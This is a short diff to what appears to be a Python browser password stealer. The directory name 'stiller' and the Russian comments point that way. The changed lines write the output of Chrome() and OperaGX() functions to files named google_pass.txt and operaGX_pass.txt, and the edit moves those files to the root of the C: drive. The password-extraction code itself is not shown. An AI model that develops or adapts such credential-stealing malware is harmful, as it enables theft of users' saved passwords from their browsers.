@@ -77,7 +77,7 @@ def Chrome():
         pass
 
 
-file = open('C:\\python\\stiller' + '\\google_pass.txt', "w+") #Сохраняем данныем в txt файл google_pass
+file = open('C:' + '\\google_pass.txt', "w+") #Сохраняем данныем в txt файл google_pass
 file.write(str(Chrome()) + '\n')
 file.close()
 
@@ -125,6 +125,6 @@ def OperaGX():
     except Exception as e:
         pass      
 
-file = open('C:\\python\\stiller' + '\\operaGX_pass.txt', "w+") #Сохраняем данныем в txt файл google_pass
+file = open('C:' + '\\operaGX_pass.txt', "w+") #Сохраняем данныем в txt файл google_pass
 file.write(str(OperaGX()) + '\n')
 file.close()
